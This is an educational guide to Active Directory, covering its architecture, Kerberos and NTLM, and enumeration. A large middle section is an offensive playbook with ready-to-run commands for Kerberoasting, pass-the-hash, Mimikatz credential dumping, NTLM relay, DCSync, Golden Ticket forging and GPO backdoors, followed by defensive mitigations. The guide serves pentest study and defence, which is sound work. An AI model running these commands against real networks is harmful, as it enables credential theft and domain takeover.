## Active Directory - Alessandro Loddo  

Last edited byAlessandro Loddo
Last updated time
## Active Directory
## Architecture, Administration & Attack Techniques
Created by Alessandro Loddo
## March 2026
March 24, 2026 1009 AM
March 24, 2026 1013 AM
Part 1 What is Active Directory?
## Overview
## Core Concepts
## Domain
Domain Controller DC
Forest and Trees
Organisational Units OUs
## Objects
## Schema
Global Catalog GC
## Trusts
## Part 2 Key Protocols
## Kerberos
## The Kerberos Authentication Flow
## NTLM
## Active Directory - Alessandro Loddo1

## LDAP
## DNS
## SMB
## Part 3 Important Structures & Objects
## Groups
## Default Privileged Groups
Service Principal Names SPNs
Group Policy Objects GPOs
ACLs and ACEs
## Part 4 Enumeration
## Tools
PowerView
BloodHound
LDAP Queries (from Linux)
Enum4Linux-ng
CrackMapExec CME
What to Look For
## Part 5 Attack Techniques
## Password Attacks
## Password Spraying
ASREP Roasting
## Kerberoasting
## Credential Attacks
Pass-the-Hash PtH
Pass-the-Ticket PtT
Overpass-the-Hash
LSASS Credential Dumping
NTLM Relay Attacks
Responder + NTLMrelayx
## Delegation Attacks
## Unconstrained Delegation
## Constrained Delegation
Resource-Based Constrained Delegation RBCD
ACL Abuse
DCSync
## Golden Ticket
## Silver Ticket
GPO Abuse
## Active Directory - Alessandro Loddo2

Part 1: What is Active Directory?
## Overview
Active Directory AD) is Microsoft's directory service for Windows domain
networks. Introduced with Windows 2000 Server, it has become the backbone of
identity and access management in virtually every mid-to-large enterprise
environment worldwide. At its core, AD is a centralised database that stores
information about every object in a network -users, computers, printers, policies,
and more -and enforces authentication and authorisation rules across all of them.
Think of Active Directory as a company's master key system. Rather than each
server managing its own list of who can log in, every machine on the domain
trusts the central AD infrastructure to answer the question: "Who is this person,
and what are they allowed to do?"
When you log into a domain-joined Windows workstation, your credentials are not
checked against the local machine. They are sent to a Domain Controller DC,
## Part 6 Lateral Movement
## Common Techniques
PsExec / SMBExec
## WMI
WinRM / Evil-WinRM
RDP Remote Desktop)
## Part 7 Persistence
## Common Persistence Mechanisms
AdminSDHolder
## Skeleton Key
DSRM Account
Golden Ticket Persistent)
## Part 8 Defensive Considerations
## Tiered Administration Model
## Protected Users Security Group
## Part 9 Quick Reference
## Key Ports
## Attack Cheat Sheet
## Essential Tools
## Active Directory - Alessandro Loddo3

which validates them against the AD database and issues a ticket that grants you
access to authorised resources across the entire network.
## Core Concepts
## Domain
A domain is the fundamental administrative boundary in Active Directory. It is a
logical group of network objects -users, computers, and devices -that share the
same AD database and are managed under a single set of policies. Domains are
identified by DNS names (e.g., corp.example.com).
Domain Controller (DC)
A Domain Controller is a server running Active Directory Domain Services AD
DS. It is the authoritative source for authentication and directory information
within its domain. Every domain must have at least one DC, and most production
environments have two or more for redundancy. The DC runs the Kerberos Key
Distribution Center KDC) and LDAP services.
Forest and Trees
A forest is the top-level container in Active Directory -it is the security boundary.
A forest contains one or more domains arranged in a hierarchy. The first domain
created is the forest root domain. Multiple domains within a forest are connected
by automatic two-way transitive trust relationships, meaning users from any
domain can potentially access resources in any other domain (subject to
permissions).
A tree is a collection of domains that share a contiguous DNS namespace (e.g.,
corp.example.com and dev.corp.example.com form a tree). Forests can contain
multiple trees with non-contiguous namespaces.
Organisational Units (OUs)
Organisational Units are containers within a domain used to organise objects
(users, computers, groups) into logical groupings. OUs are the primary
mechanism for delegating administrative control and applying Group Policy
Objects GPOs to specific subsets of the domain.
## Active Directory - Alessandro Loddo4

## Objects
Everything stored in Active Directory is an object. The most important object types
are:
User accounts -people who authenticate to the domain
Computer accounts -domain-joined machines
Groups -collections of users or computers for permission management
Printers, shared folders, and other network resources
Service accounts -accounts used by applications and services
## Schema
The AD schema defines every object class (what types of objects exist) and every
attribute (what properties those objects can have). The schema is forest-wide and
shared by all domains. Extending the schema -for example, when installing
Exchange or SCCM -adds new object types and attributes.
Global Catalog (GC)
The Global Catalog is a partial replica of all objects from all domains in a forest. A
Global Catalog Server holds a full copy of all objects in its own domain and a
subset of attributes for objects in all other domains. It enables forest-wide
searches and is essential for user logon in multi-domain environments.
## Trusts
Trusts define the relationships between domains or forests that allow users in one
to access resources in another. Key trust types include:
Transitive trust -extends automatically through a chain of domains (default
within a forest)
One-way / Two-way trust -controls direction of authentication flow
External trust -non-transitive trust to a domain outside the forest
Forest trust -transitive trust between two forest root domains
## Active Directory - Alessandro Loddo5

## Part 2: Key Protocols
## Kerberos
Kerberos is the default authentication protocol in Active Directory environments. It
is a ticket-based system that allows users to authenticate once and then access
multiple services without re-entering credentials.
## The Kerberos Authentication Flow
ASREQ The client sends an Authentication Service Request to the KDC
(running on the DC, containing the username and a timestamp encrypted with
the user's password hash.
ASREP The KDC returns a Ticket Granting Ticket TGT) encrypted with the
krbtgt account's hash, and a session key encrypted with the user's hash.
TGSREQ When accessing a service, the client presents the TGT to the KDC
and requests a Service Ticket TGS) for the specific service (identified by its
## SPN.
TGSREP The KDC issues a Service Ticket encrypted with the service
account's hash.
APREQ The client presents the Service Ticket directly to the target service,
which decrypts it with its own hash to verify authenticity.
Important: the KDC never directly contacts the service. The tickets carry all the
necessary information and the verification is cryptographic. This design is central
to understanding many AD attack techniques.
## NTLM
NT LAN Manager NTLM) is an older challenge-response authentication protocol
that is still widely used as a fallback when Kerberos is unavailable (e.g., when
accessing a resource by IP address instead of hostname). NTLM does not require
a Domain Controller to be contacted at the service end, making it weaker and a
popular target for relay attacks.
## LDAP
## Active Directory - Alessandro Loddo6

Lightweight Directory Access Protocol LDAP) is the protocol used to query and
modify the Active Directory database. Administrators, applications, and attackers
use LDAP to search for objects, read attributes, and make changes. AD listens on
TCP 389 for standard LDAP and TCP 636 for LDAP over SSL LDAPS.
## DNS
Active Directory is deeply integrated with DNS. Domain Controllers register
themselves in DNS with SRV records so clients can locate services. Most AD
enumeration and attacks begin with DNS queries.
## SMB
Server Message Block SMB) is the file-sharing protocol used throughout
Windows networks. It runs on TCP 445. Critically, Group Policy Objects are
distributed to clients via the SYSVOL share over SMB, and most lateral movement
techniques rely on SMB.
## Part 3: Important Structures & Objects
## Groups
Groups are collections of users, computers, or other groups used to assign
permissions. There are two dimensions: scope and type.
Group TypeScopeDescription
SecurityDomain LocalAssign permissions to resources in the same domain
SecurityGlobal
Organise users from the same domain; used in other
domains
SecurityUniversalForest-wide membership and resource assignment
DistributionAnyEmail distribution lists only; cannot assign permissions
## Default Privileged Groups
Several groups are created by default and carry significant privileges. These are
primary targets during privilege escalation:
## Active Directory - Alessandro Loddo7

Domain Admins -full administrative control over the entire domain
Enterprise Admins -administrative control across all domains in the forest
Schema Admins -can modify the AD schema
Group Policy Creator Owners -can create and modify GPOs
Account Operators -can create and manage user/group accounts
Backup Operators -can bypass file/directory permissions for backup
purposes; can also log on locally to DCs
Server Operators -can log on interactively to DCs and manage domain
services
Service Principal Names (SPNs)
An SPN is a unique identifier for a service instance, associating a service with a
specific account. When a client wants to authenticate to a service using Kerberos,
it requests a ticket for the service's SPN. SPNs are registered in AD as attributes
of user or computer accounts.
Format: serviceClass/host:port/serviceName -for example,
MSSQLSvc/dbserver.corp.local:1433.
The existence of SPNs on user accounts (as opposed to computer accounts) is a
critical factor in Kerberoasting attacks (covered in Part 5.
Group Policy Objects (GPOs)
GPOs are collections of settings that control the working environment of user and
computer accounts. They can configure security settings, software installation,
scripts, desktop restrictions, and much more. GPOs are linked to Sites, Domains,
or OUs, and are applied in that order SDOU.
From an attacker's perspective, GPOs are extremely powerful: a user who can
modify a GPO linked to a high-privilege OU can potentially push malicious
configurations to every computer in that OU.
ACLs and ACEs
## Active Directory - Alessandro Loddo8

Active Directory objects are secured by Access Control Lists ACLs. Each ACL
contains a list of Access Control Entries ACEs, which grant or deny specific
permissions to specific principals. Permissions such as GenericAll, WriteDACL,
WriteOwner, and ForceChangePassword can be weaponised to escalate
privileges, even without being in a privileged group.
## Part 4: Enumeration
Enumeration is the process of gathering information about the AD environment. It
is almost always the first step after gaining an initial foothold. The goal is to
understand the domain structure, identify privileged accounts, locate
misconfigurations, and map attack paths.
## Tools
PowerView
PowerView is a PowerShell script from the PowerSploit framework. It is the most
commonly used tool for AD enumeration from within a Windows environment.
# Basic domain info
Get-Domain
Get-DomainController
# User enumeration
Get-DomainUser | select samaccountname,description
Get-DomainUser SPN                           # Find Kerberoastable accounts
Get-DomainUser PreauthNotRequired             # Find ASREP Roastable accounts
# Group enumeration
Get-DomainGroup | select name
Get-DomainGroupMember Identity 'Domain Admins'
# Computer enumeration
Get-DomainComputer | select dnshostname,operatingsystem
# GPO enumeration
## Active Directory - Alessandro Loddo9

Get-DomainGPO | select displayname
# ACL enumeration (find interesting permissions)
Find-InterestingDomainAcl ResolveGUIDs
BloodHound
BloodHound is a graphical attack path analysis tool that ingests AD data and
visualises privilege escalation paths. It uses graph theory to find shortest paths
from low-privilege users to Domain Admin.
# Collect data with SharpHound (run on domain-joined machine)
Invoke-BloodHound CollectionMethod All OutputDirectory C\Temp
# Or use the Python ingestor from Linux
bloodhound-python -u user -p password -d corp.local -c All --dns-tcp
LDAP Queries (from Linux)
# Anonymous / authenticated LDAP enumeration
ldapsearch -x H ldap://dc.corp.local -b 'DC=corp,DC=local' '(objectClass=user)'
# With credentials
ldapsearch -x H ldap://dc.corp.local D 'user@corp.local' -w 'Password1' \
-b 'DC=corp,DC=local' '(objectClass=user)' samAccountName
Enum4Linux-ng
enum4linux-ng A dc.corp.local
enum4linux-ng A -u user -p password dc.corp.local
CrackMapExec (CME)
# Enumerate shares, users, and RID brute-force
crackmapexec smb dc.corp.local -u user -p password --shares
crackmapexec smb dc.corp.local -u user -p password --users
crackmapexec smb dc.corp.local -u user -p password --groups
## Active Directory - Alessandro Loddo10

What to Look For
During enumeration, the following findings are particularly valuable:
Users with the Description field containing passwords (a surprisingly common
misconfiguration)
Accounts with Kerberos pre-authentication disabled ASREP Roasting
targets)
Accounts with SPNs registered Kerberoasting targets)
ACEs granting GenericAll, GenericWrite, WriteDACL, or WriteOwner to low-
privilege users
GPOs linked to OUs containing privileged users or DCs that are writeable by
non-admins
Unconstrained delegation settings on computers or users
Local administrator membership on workstations (for lateral movement)
Trust relationships to other domains or forests
## Part 5: Attack Techniques
## Password Attacks
## Password Spraying
Password spraying tests one or a small number of common passwords against
many accounts, staying below lockout thresholds. It is often the first active attack
step.
# CrackMapExec
crackmapexec smb dc.corp.local -u users.txt -p 'Password123' --continue-on-
success
# Kerbrute (uses Kerberos, does not trigger LDAP lockout logging)
kerbrute passwordspray -d corp.local --dc dc.corp.local users.txt 'Password123'
## Active Directory - Alessandro Loddo11

Warning: Always check the domain's password policy first. Spraying without
knowing the lockout threshold can lock out a large number of accounts, causing a
denial of service and triggering immediate detection.
AS-REP Roasting
If a user account has the DONT_REQUIRE_PREAUTH flag set, the KDC will return
an encrypted ASREP without requiring the client to prove knowledge of the
password first. An attacker can request this encrypted blob and crack it offline.
## # From Linux
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1
# From Windows PowerView)
Get-DomainUser PreauthNotRequired | select samaccountname
Invoke-ASREPRoast OutputFormat hashcat
# Crack the hash
hashcat -m 18200 hashes.txt wordlist.txt
## Kerberoasting
Any authenticated domain user can request a Service Ticket for any SPN. The
resulting ticket is encrypted with the service account's password hash. If the
service account is a user account (rather than a computer account with a long
random password), the hash can be cracked offline.
## # From Linux
impacket-GetUserSPNs corp.local/user:password -dc-ip 10.10.10.1 -request
## # From Windows
Invoke-Kerberoast OutputFormat hashcat
# Crack with Hashcat
hashcat -m 13100 hashes.txt wordlist.txt
Note: Managed Service Accounts MSAs and Group Managed Service Accounts
(gMSAs) use auto-generated 120+ character passwords and are not
Kerberoastable in practice.
## Active Directory - Alessandro Loddo12

## Credential Attacks
Pass-the-Hash (PtH)
NTLM authentication requires the client to prove knowledge of the password
hash, not the plaintext password. If an attacker has obtained an NTLM hash, they
can authenticate as that user without cracking it.
# CrackMapExec
crackmapexec smb 10.10.10.0/24 -u administrator H
aad3b435b51404eeaad3b435b51404ee:ntlmhash
## # Impacket
impacket-psexec administrator@10.10.10.5 -hashes aad3:ntlmhash
impacket-wmiexec administrator@10.10.10.5 -hashes aad3:ntlmhash
Pass-the-Ticket (PtT)
Kerberos tickets TGTs or Service Tickets) stored on disk or in memory can be
extracted and injected into a new session to impersonate a user.
# Extract tickets from memory (requires elevated privileges)
Invoke-Mimikatz Command '"sekurlsa::tickets /export"'
mimikatz # sekurlsa::tickets /export
# Inject a ticket
mimikatz # kerberos::ptt ticket.kirbi
Invoke-Mimikatz Command '"kerberos::ptt ticket.kirbi"'
Overpass-the-Hash
Converts an NTLM hash into a full Kerberos TGT, allowing Kerberos authentication
with just the hash. More stealthy than PtH since it generates Kerberos traffic.
mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:HASH
## /run:powershell.exe
LSASS Credential Dumping
## Active Directory - Alessandro Loddo13

The Local Security Authority Subsystem Service LSASS) process caches
credentials in memory. Dumping LSASS yields NTLM hashes, Kerberos tickets,
and sometimes plaintext passwords (on older systems or where WDigest is
enabled).
# Mimikatz (requires SYSTEM or SeDebugPrivilege)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# Create a minidump and process offline
# Task Manager > Details > lsass.exe > Create dump file
# Then on attacker machine:
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
NTLM Relay Attacks
Responder + NTLMrelayx
NTLM relay attacks intercept NTLM authentication attempts and relay them to
another target. Responder poisons NetBIOS/LLMNR name resolution to capture
authentication attempts, while NTLMrelayx relays them.
# Step 1 Start Responder (listen for poisoning opportunities)
sudo responder I eth0 -rdwv
# Step 2 Relay captured hashes to SMB on other hosts
impacket-ntlmrelayx -tf targets.txt -smb2support
# Or relay to LDAP to create a new admin account
impacket-ntlmrelayx -t ldap://dc.corp.local --escalate-user lowpriv
Note: SMB signing must be disabled on the target for SMB relay to work. Check
with: crackmapexec smb 10.10.10.0/24 --gen-relay-list unsigned.txt
## Delegation Attacks
## Active Directory - Alessandro Loddo14

## Unconstrained Delegation
When a computer is configured with Unconstrained Delegation, it receives and
caches users' full TGTs when they authenticate to it. If an attacker compromises
this machine, they can extract all cached TGTs -including those of Domain
## Admins.
# Find computers with Unconstrained Delegation
Get-DomainComputer Unconstrained | select dnshostname
# Once compromised, extract TGTs from memory
mimikatz # sekurlsa::tickets /export
# Force a DC to authenticate to the compromised machine Printer Bug /
SpoolSample)
.\SpoolSample.exe dc.corp.local compromised.corp.local
## Constrained Delegation
Constrained Delegation allows a service to request Kerberos tickets on behalf of a
user, but only to specific services. An attacker who compromises an account with
constrained delegation can use the S4U2Self and S4U2Proxy Kerberos extensions
to obtain a service ticket for any user (including Domain Admins) to the allowed
services.
# Find accounts with Constrained Delegation
Get-DomainUser TrustedToAuth | select samaccountname,msds-
allowedtodelegateto
# Abuse with Rubeus
Rubeus.exe s4u /user:svcaccount /rc4HASH /impersonateuser:administrator
## /msdsspn:cifs/server.corp.local /ptt
Resource-Based Constrained Delegation (RBCD)
RBCD allows a resource (computer) to specify which principals can delegate to it.
If an attacker can write to the msDSAllowedToActOnBehalfOfOtherIdentity
attribute of a computer object, they can set up delegation from any computer
account they control and then impersonate any user to that target.
## Active Directory - Alessandro Loddo15

# If we have GenericWrite over TARGETPC$
# 1. Create a fake computer account
impacket-addcomputer corp.local/user:password -computer-name FAKE$ -
computer-pass Password123
# 2. Set RBCD on the target
Set-DomainRBCD Identity TARGETPC DelegateFrom FAKE$
# 3. Get a service ticket as any user
Rubeus.exe s4u /user:FAKE$ /rc4HASH /impersonateuser:administrator
/msdsspn:cifs/TARGETPC.corp.local /ptt
ACL Abuse
Misconfigured ACL permissions are extremely common in AD environments and
provide quiet privilege escalation paths that do not show up in group membership
checks.
PermissionWhat an Attacker Can Do
GenericAllFull control -reset password, add to groups, modify any attribute
GenericWrite
Modify any non-protected attribute, including setting an SPN
(enabling Kerberoasting) or modifying logon scripts
WriteDACL
Modify the object's DACL -can grant yourself any other
permission
WriteOwnerTake ownership of the object, then grant yourself full control
ForceChangePasswordReset the user's password without knowing the current one
AddMember
Add members to a group -escalate by adding self to a privileged
group
AllExtendedRightsIncludes DSReplication-Get-Changes -enables DCSync attacks
# Enumerate ACLs with BloodHound or PowerView
Find-InterestingDomainAcl ResolveGUIDs | ?$_.IdentityReferenceName -match
## 'lowpriv'}
# Abuse: Add self to group if you have GenericAll/AddMember
Add-DomainGroupMember Identity 'Domain Admins' Members 'lowpriv'
## Active Directory - Alessandro Loddo16

# Abuse: Force password change
$cred = ConvertTo-SecureString 'NewPass123!' AsPlainText Force
Set-DomainUserPassword Identity targetuser AccountPassword $cred
DCSync
DCSync mimics a Domain Controller's replication behaviour to request password
data from another DC. Any account with the DSReplication-Get-Changes and DS
Replication-Get-Changes-All permissions can perform this attack -by default, only
Domain Admins and the SYSTEM account have these rights, but they can be
delegated through ACL abuse.
## # Mimikatz
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
## # Impacket (from Linux)
impacket-secretsdump corp.local/domainadmin:password@dc.corp.local
Obtaining the krbtgt hash enables a Golden Ticket attack; obtaining the hash for
any account enables Pass-the-Hash.
## Golden Ticket
A Golden Ticket is a forged Kerberos TGT. Because it is signed with the krbtgt
account's hash (obtainable via DCSync), it can be used to generate service tickets
for any service in the domain as any user, including non-existent users. Golden
Tickets persist even after a password reset unless the krbtgt account is reset
twice.
# First, obtain the krbtgt hash via DCSync or LSASS dump
# Then forge the TGT
mimikatz # kerberos::golden /domain:corp.local /sid:S1521... /krbtgt:HASH
## /user:fakeadmin /ptt
# Or with Impacket
## Active Directory - Alessandro Loddo17

impacket-ticketer -nthash KRBTGT_HASH -domain-sid S1521... -domain
corp.local Administrator
export KRB5CCNAMEAdministrator.ccache
impacket-psexec -k -no-pass administrator@dc.corp.local
## Silver Ticket
A Silver Ticket is a forged Service Ticket for a specific service, signed with the
service account's hash rather than the krbtgt hash. It does not require
communication with the KDC and is therefore harder to detect. Common targets
are cifs/ SMB file access), host/ (remote management), and http/ (web services).
mimikatz # kerberos::golden /domain:corp.local /sid:S1521... \
/target:server.corp.local /service:cifs /rc4SERVICE_HASH /user:administrator /ptt
GPO Abuse
If an attacker has write access to a GPO (or can create one linked to a privileged
OU, they can use it to push arbitrary commands to every computer and user in
that OU.
# Find writeable GPOs
Get-DomainGPO | %  Get-ObjectAcl Identity $_.CN ResolveGUIDs | ?
{$_.ActiveDirectoryRights -match 'Write'} }
# SharpGPOAbuse -add a local admin or scheduled task via GPO
SharpGPOAbuse.exe AddLocalAdmin UserAccount lowpriv GPOName
'Writeable GPO'
SharpGPOAbuse.exe AddComputerTask TaskName Backdoor Author
## SYSTEM \
Command 'cmd.exe' Arguments '/c net localgroup administrators lowpriv
/add' GPOName 'Writeable GPO'
## Part 6: Lateral Movement
## Active Directory - Alessandro Loddo18

## Common Techniques
PsExec / SMBExec
Authenticates over SMB, creates a service on the remote host, and runs
commands through it. Leaves significant artefacts on disk and in the Event Log.
impacket-psexec corp.local/administrator:password@10.10.10.5
impacket-smbexec corp.local/administrator:password@10.10.10.5
## WMI
Windows Management Instrumentation allows remote command execution with
fewer artefacts than PsExec. Does not create a service.
impacket-wmiexec corp.local/administrator:password@10.10.10.5
## # From Windows
Invoke-WmiMethod Class Win32_Process Name Create ArgumentList 'cmd.exe
/c whoami > C\out.txt' ComputerName target
WinRM / Evil-WinRM
Windows Remote Management WinRM) runs on port TCP 5985 HTTP) and TCP
5986 HTTPS. Users in the Remote Management Users or Administrators group
can use it for interactive shell access.
evil-winrm -i 10.10.10.5 -u administrator -p password
evil-winrm -i 10.10.10.5 -u administrator H NTHASH
RDP (Remote Desktop)
If port TCP 3389 is open, administrators can connect via GUI. Restricted Admin
mode allows Pass-the-Hash over RDP.
# Enable Restricted Admin mode (if you have admin on target)
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
/t REG_DWORD /d 0
# Then PtH with xfreerdp
xfreerdp /v:10.10.10.5 /u:administrator /pth:NTHASH /cert:ignore
## Active Directory - Alessandro Loddo19

## Part 7: Persistence
## Common Persistence Mechanisms
AdminSDHolder
The AdminSDHolder object holds a template ACL that is periodically applied
(every 60 minutes by the SDProp process) to all protected groups and their
members. If an attacker adds an ACE to AdminSDHolder, that permission
propagates to all privileged group members, including Domain Admins.
# Grant a low-priv user GenericAll on AdminSDHolder
Add-DomainObjectAcl TargetIdentity
'CNAdminSDHolder,CNSystem,DC=corp,DC=local' \
PrincipalIdentity lowpriv Rights All
## Skeleton Key
Skeleton Key patches LSASS on a Domain Controller to accept a master password
alongside the real user password. Requires physical or SYSTEM access to a DC.
Does not survive a DC reboot.
mimikatz # misc::skeleton
# Now any user can authenticate with password 'mimikatz' in addition to their real
password
DSRM Account
The Directory Services Restore Mode DSRM) account is a local administrator
account on each Domain Controller used for offline maintenance. Its password is
rarely changed. With SYSTEM access to a DC, an attacker can extract the DSRM
hash, configure the DC to allow network authentication with it, and maintain
persistent Domain Admin-equivalent access.
mimikatz # token::elevate
mimikatz # lsadump::sam
# Allow DSRM account to logon over network
## Active Directory - Alessandro Loddo20

reg add HKLM\System\CurrentControlSet\Control\Lsa /v
DsrmAdminLogonBehavior /t REG_DWORD /d 2
# Use PtH with the DSRM hash
impacket-secretsdump -hashes DSRM_HASH 'Administrator@dc.corp.local'
Golden Ticket (Persistent)
As described in Part 5, a Golden Ticket forged with the krbtgt hash provides long-
term domain persistence. To invalidate a Golden Ticket, the krbtgt account
password must be reset twice (because Kerberos accepts tickets issued with the
previous password as well). Defenders should plan to perform this operation
during incident response.
## Part 8: Defensive Considerations
Understanding attacks is inseparable from understanding defence. The following
are key mitigations directly countering the techniques described in this guide.
TechniqueKey Mitigations
## Password Spraying
Fine-grained password policies; lockout thresholds; monitoring for
4625 events; Azure AD Smart Lockout
ASREP Roasting
Enable pre-authentication on all accounts; use strong passwords on
any exceptions; monitor 4768 events with pre-auth type 0
## Kerberoasting
Use MSAs/gMSAs for service accounts; enforce strong 25+ char)
passwords; monitor 4769 events for RC4 encryption requests
NTLM Relay
Enable SMB signing (required, not just supported); enable LDAP
signing and channel binding; disable LLMNR/NBTNS
## Credential Dumping
Credential Guard; Protected Users group; restrict SeDebugPrivilege;
monitor process access to LSASS Event 10 in Sysmon)
DCSync
Restrict replication rights; monitor 4662 events with replication
GUIDs; alert on non-DC accounts performing replication
## Golden Ticket
Reduce Kerberos ticket lifetime; monitor for tickets with unusually
long lifetimes or from non-existent accounts; reset krbtgt twice after
compromise
## Active Directory - Alessandro Loddo21

## Unconstrained
## Delegation
Avoid unconstrained delegation; use constrained or resource-based
delegation; add DCs to Protected Users group; monitor TGT
delegation
ACL Abuse
Regular ACL audits with BloodHound; restrict delegation of sensitive
permissions; monitor AD object modifications 5136 events)
GPO Abuse
Regular review of GPO permissions; tier administration model;
monitor GPO changes 5136, 5137 events)
## Tiered Administration Model
Microsoft's tier model separates administrative accounts by the sensitivity of the
resources they manage:
Tier 0 Domain Controllers, AD itself, federation services. Only Tier 0
credentials used here.
Tier 1 Server infrastructure (application servers, databases). Separate admin
accounts.
Tier 2 Workstations and endpoints. Separate local admin accounts.
The principle: a credential used at a lower tier should never be used at a higher
tier. This prevents credential theft at the workstation level from compromising
Domain Controllers directly.
## Protected Users Security Group
Adding users to the Protected Users group applies several hardened settings: no
NTLM authentication, no Kerberos delegation, no DES/RC4 Kerberos, 4-hour TGT
lifetime, and credentials not cached in LSASS. This group is especially
recommended for all privileged accounts Domain Admins, service account
administrators, etc.).
## Part 9: Quick Reference
## Key Ports
PortProtocolUse
## Active Directory - Alessandro Loddo22

88Kerberos TCP/UDPAuthentication ticket exchange KDC
## 135MSRPC
RPC endpoint mapper; used by many AD
services
139NetBIOS / SMBLegacy SMB; NBTNS name resolution
389LDAPDirectory queries and modifications
445SMBFile sharing, lateral movement, GPO distribution
464Kerberos (kpasswd)Password change protocol
636LDAPSLDAP over SSL
3268Global Catalog LDAPForest-wide object searches
## 3269
## Global Catalog
## LDAPS
Encrypted GC searches
3389RDPRemote Desktop access
5985WinRM HTTPPowerShell remoting
5986WinRM HTTPSEncrypted PowerShell remoting
## Attack Cheat Sheet
AttackRequirementOutcome
ASREP RoastingPre-auth disabled account
Offline crack of user
password hash
KerberoastingAny domain user; target with SPN
Offline crack of service
account password
Pass-the-HashNTLM hash of user
Authenticate as that
user via NTLM
Pass-the-TicketKerberos ticket from memory
Authenticate as ticket
holder
NTLM RelayCaptured NTLM auth; SMB signing disabled
Authenticate to other
hosts as captured user
DCSyncDSReplication rights
Extract all domain
password hashes
Golden Ticketkrbtgt hash
Forge TGTs as any
user, indefinitely
## Active Directory - Alessandro Loddo23

Silver TicketService account hash
Forge service tickets
for that service
## Unconstrained
## Delegation
Compromise of server with unconstrained
delegation
Capture TGTs from any
authenticating user
RBCD Abuse
Write to msDS
AllowedToActOnBehalfOfOtherIdentity on
target
Impersonate any user
to target service
## Essential Tools
ToolPlatformPrimary Use
BloodHound /
SharpHound
## Both
Attack path analysis and AD graph
visualisation
PowerViewWindowsDomain enumeration via PowerShell
MimikatzWindows
Credential extraction, Golden/Silver tickets,
delegation
RubeusWindows
Kerberos ticket operations and delegation
abuse
ImpacketLinux
Full suite: secretsdump, GetUserSPNs,
ntlmrelayx, psexec
CrackMapExecLinux
Network-wide SMB/WMI/LDAP operations and
spraying
ResponderLinux
LLMNR/NBTNS poisoning for credential
capture
Evil-WinRMLinuxInteractive WinRM shell
KerbruteBoth
User enumeration and password spraying via
## Kerberos
ldapdomaindumpLinuxDump AD info to HTML/JSON via LDAP
## Active Directory - Alessandro Loddo24
